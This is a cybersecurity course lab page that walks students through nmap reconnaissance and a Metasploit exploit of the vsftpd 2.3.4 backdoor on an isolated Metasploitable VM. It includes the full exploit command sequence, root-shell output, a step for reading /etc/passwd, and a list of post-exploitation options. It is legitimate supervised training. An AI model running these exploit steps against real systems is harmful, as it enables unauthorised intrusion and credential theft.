# Week 11 — Metasploitable & Exploitation

<div class="session-meta">
  <span>📅 Week 11</span>
  <span>⏱ 2 Hours</span>
  <span>🔴 Phase 2 — Active Threat</span>
  <span>📋 ICTSAS214 · ICTSAS305</span>
</div>

---

!!! danger "MISSION BRIEF"
    **Incident Reference:** RBS-2025-011  
    Intelligence indicates the attacker may have used a known vulnerability in a 
    legacy service on the Redback Systems server. You need to understand how that 
    works. Today you run controlled exploits against Metasploitable — your isolated,
    deliberately vulnerable target VM. Air-gapped. No internet. 
    You have explicit authorisation to test this machine.

---

## Learning Objectives

- [ ] Use nmap to enumerate open ports and services on a target
- [ ] Identify exploitable services using Metasploit's search function
- [ ] Run a controlled exploit against Metasploitable
- [ ] Explain what an attacker gains from a successful exploit
- [ ] Document findings in an incident-style report

---

## 1. Reconnaissance — nmap

Before you exploit anything, you need to know what's running.

```bash
# Basic scan — open ports
nmap 192.168.56.101

# Service version detection
nmap -sV 192.168.56.101

# OS detection + scripts + version (the full scan)
nmap -A 192.168.56.101

# Scan specific ports
nmap -p 21,22,80,3306 192.168.56.101

# Save output
nmap -A 192.168.56.101 -oN metasploitable-scan.txt
```

Metasploitable will show a large number of open ports. This is intentional. In a real environment, every open port is a potential attack vector.

---

## 2. Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for an exploit
msf> search vsftpd
msf> search type:exploit platform:linux

# Use an exploit
msf> use exploit/unix/ftp/vsftpd_234_backdoor

# Show options
msf> show options

# Set target
msf> set RHOSTS 192.168.56.101

# Run the exploit
msf> run
```

---

## 3. A Guided Example — vsftpd backdoor

Metasploitable runs vsftpd 2.3.4 — a version that had a backdoor deliberately inserted by an attacker who compromised the source code in 2011. It was in the wild for two months before discovery.

```bash
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor)> set RHOSTS 192.168.56.101
msf exploit(vsftpd_234_backdoor)> run

# If successful:
[*] Command shell session 1 opened

# You now have a shell on the target
id
# uid=0(root) gid=0(root)
```

Root access from a single exploit. This is what supply chain attacks look like.

!!! warning "STAY ON METASPLOITABLE"
    Your Metasploitable VM is on host-only network.
    Confirm `RHOSTS` is set to Metasploitable's IP before running any exploit.
    Pointing this at anything else is illegal.

---

## 4. What Does This Mean?

Once you have a shell, an attacker can:

- Read any file on the system (`cat /etc/passwd`, `/etc/shadow`)
- Create backdoor accounts
- Install persistent malware
- Use this machine to pivot to others on the network
- Exfiltrate data

The fix: **patch your systems.** vsftpd 2.3.4 was immediately superseded. This vulnerability only exists on unpatched systems.

---

## Lab Task

!!! example "TASK 11.1 — Controlled Exploitation"

    Target: Metasploitable VM (host-only network — confirm before proceeding)
    
    ```bash
    # Step 1 — Confirm target IP
    # In Metasploitable VM: ip addr
    # Note: usually 192.168.56.101
    
    # Step 2 — Run nmap scan
    nmap -sV [metasploitable-ip] -oN week11-scan.txt
    
    # Step 3 — Identify 3 exploitable services from scan output
    # Research each in Metasploit: search [service name]
    
    # Step 4 — Run the vsftpd exploit
    # Follow the guided example above
    # Screenshot: successful shell session with id command output
    
    # Step 5 — From the shell, run:
    cat /etc/passwd
    # Screenshot the output
    ```
    
    **Written deliverable:** For each of the 3 services you identified:
    
    - Service name and version
    - CVE number (search on cve.mitre.org)
    - What an attacker could do with successful exploitation
    - How to fix it (patch, disable, firewall rule)
    
    This is your first full vulnerability report. Submit to AT1 portfolio.

---

## Unit Mapping

??? info "Assessment Mapping — click to expand"

    | Activity | Unit | Element |
    |----------|------|---------|
    | nmap enumeration | ICTSAS214 | 1.1, 1.2, 1.3 |
    | Exploitation | ICTSAS214 | 2.1, 2.2, 2.3 |
    | Vulnerability report | ICTSAS305 | 1.3, 2.2, 2.3 |
